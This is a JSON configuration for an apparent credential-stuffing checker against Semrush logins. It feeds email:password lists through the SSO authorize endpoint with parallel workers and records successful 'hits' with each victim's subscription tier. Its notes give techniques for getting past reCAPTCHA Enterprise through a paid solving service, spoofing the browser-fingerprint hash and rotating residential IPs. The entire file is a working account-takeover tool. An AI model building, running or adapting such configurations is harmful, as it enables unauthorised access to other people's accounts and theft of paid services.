{
  "id": "semrush",
  "name": "Semrush",
  "description": "SSO JSON login — built from ONF capture task_20260613_215600 (www.semrush.com)",
  "source_capture": "task_20260613_215600",
  "settings": {
    "workers": 5,
    "timeout_seconds": 45,
    "retry_on_error": 3,
    "delay_ms": 500
  },
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
  "credentials": {
    "separator": ":",
    "email_field": "email",
    "password_field": "password"
  },
  "variables": {
    "base_url": "https://www.semrush.com",
    "login_url": "https://www.semrush.com/login/?src=header&redirect_to=%2F",
    "authorize_url": "https://www.semrush.com/sso/authorize",
    "sso_options_url": "https://www.semrush.com/sso/options?version=4.4.1",
    "olaf_init_url": "https://www.semrush.com/olaf/init",
    "dashboard_url": "https://www.semrush.com/home/",
    "subscription_page_url": "https://www.semrush.com/accounts/subscription-info/",
    "account_query_url": "https://www.semrush.com/accounts/subscription-info/api/v1/header/",
    "toolkits_summary_url": "https://www.semrush.com/accounts/subscription-info/api/v1/toolkits/summary/",
    "user_info_url": "https://www.semrush.com/accounts/user-info",
    "sso_version": "4.4.1",
    "user_agent_hash": "8109d0ebea1d682bbe7bc3ab7242c807",
    "recaptcha_site_key": "6Ldw6DYUAAAAACFCNmvsT32P6VPVonpjbSS7XTA9",
    "twocaptcha_api_key": ""
  },
  "steps": [
    {
      "id": "login_page",
      "name": "Load login page (PHPSESSID + site_csrftoken cookies)",
      "method": "GET",
      "url": "{{login_url}}",
      "headers": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "{{user_agent}}"
      }
    },
    {
      "id": "olaf_init",
      "name": "Bot/session bootstrap",
      "method": "POST",
      "url": "{{olaf_init_url}}",
      "headers": {
        "Accept": "*/*",
        "Origin": "{{base_url}}",
        "Referer": "{{login_url}}",
        "User-Agent": "{{user_agent}}"
      }
    },
    {
      "id": "sso_options",
      "name": "SSO flags/options",
      "method": "POST",
      "url": "{{sso_options_url}}",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "{{base_url}}",
        "Referer": "{{login_url}}",
        "User-Agent": "{{user_agent}}"
      },
      "body": "{\"withCredentials\":true,\"user-agent-hash\":\"{{user_agent_hash}}\"}"
    },
    {
      "id": "sso_authorize",
      "name": "Submit credentials",
      "method": "POST",
      "url": "{{authorize_url}}",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "{{base_url}}",
        "Referer": "{{login_url}}",
        "User-Agent": "{{user_agent}}"
      },
      "body": "{\"locale\":\"en\",\"source\":\"semrush\",\"g-recaptcha-response\":\"\",\"user-agent-hash\":\"{{user_agent_hash}}\",\"email\":\"{{email}}\",\"password\":\"{{password}}\"}",
      "failure_signals": {
        "status_codes": [401, 403, 429],
        "body_contains": [
          "ERROR_INVALID_CREDENTIALS",
          "invalid email or password",
          "Wrong login or password",
          "wrong login or password",
          "ERROR_UAHASH_INVALID",
          "ERROR_RECAPTCHA",
          "too many attempts"
        ]
      }
    },
    {
      "id": "subscription_header",
      "name": "Fetch subscription plan (GET /accounts/subscription-info/api/v1/header/)",
      "optional": true,
      "method": "GET",
      "url": "{{account_query_url}}",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "Referer": "{{subscription_page_url}}",
        "User-Agent": "{{user_agent}}"
      },
      "extract": {
        "plan_name": {
          "source": "json_body",
          "path": "subscription.title"
        },
        "is_free": {
          "source": "json_body",
          "path": "subscription.is_free"
        },
        "paid_till": {
          "source": "json_body",
          "path": "subscription.paid_till"
        }
      }
    },
    {
      "id": "toolkits_summary",
      "name": "Fallback — purchased toolkit tiers",
      "optional": true,
      "method": "GET",
      "url": "{{toolkits_summary_url}}",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "Referer": "{{subscription_page_url}}",
        "User-Agent": "{{user_agent}}"
      }
    }
  ],
  "validation": {
    "hit": {
      "step": "sso_authorize",
      "status": 200,
      "require_extract": []
    },
    "fail": {
      "any_step_failure_signal": true
    }
  },
  "plan_labels": {
    "free_trial": {
      "match": { "plan_name_contains": "Trial" },
      "label": "FREE_TRIAL"
    },
    "free": {
      "match": { "plan_name_contains": "Free" },
      "label": "FREE"
    },
    "pro": {
      "match": { "plan_name_contains": "Pro" },
      "label": "PRO"
    },
    "guru": {
      "match": { "plan_name_contains": "Guru" },
      "label": "GURU"
    },
    "business": {
      "match": { "plan_name_contains": "Business" },
      "label": "BUSINESS"
    },
    "paid": {
      "match": {},
      "label": "PAID"
    }
  },
  "output": {
    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | Label={{plan_label}}",
    "console_hit": "[HIT] {{email}} | Plan: {{plan_name}} ({{plan_label}})",
    "console_fail": "[FAIL] {{email}} | {{reason}}",
    "files": {
      "hits": "results/semrush/run_<timestamp>/hits.txt",
      "invalid": "results/semrush/run_<timestamp>/invalid.txt",
      "rate_limited": "results/semrush/run_<timestamp>/rate_limited.txt",
      "errors": "results/semrush/run_<timestamp>/errors.txt",
      "summary": "results/semrush/run_<timestamp>/summary.txt"
    }
  },
  "notes": [
    "Login flow from network.ndjson capture (POST /sso/authorize with email/password JSON).",
    "user_agent_hash is FingerprintJS visitorId — update from browser DevTools if checks fail with ERROR_UAHASH_INVALID.",
    "Plan API from capture: GET /accounts/subscription-info/api/v1/header/ → subscription.title (Free/Pro/Guru/Business).",
    "Fallback: GET /accounts/subscription-info/api/v1/toolkits/summary/ → tiers with is_purchased=true.",
    "Semrush requires reCAPTCHA Enterprise on /sso/authorize — set twocaptcha_api_key in variables (or TWOCAPTCHA_API_KEY env).",
    "HTTP 201 on /sso/authorize = success. reCAPTCHA hits go to recaptcha_required.txt.",
    "For fewer captchas: 1 worker, unique residential IP per login, update user_agent_hash from browser.",
    "Do NOT commit real user_agent_hash tied to your browser session in public repos."
  ]
}
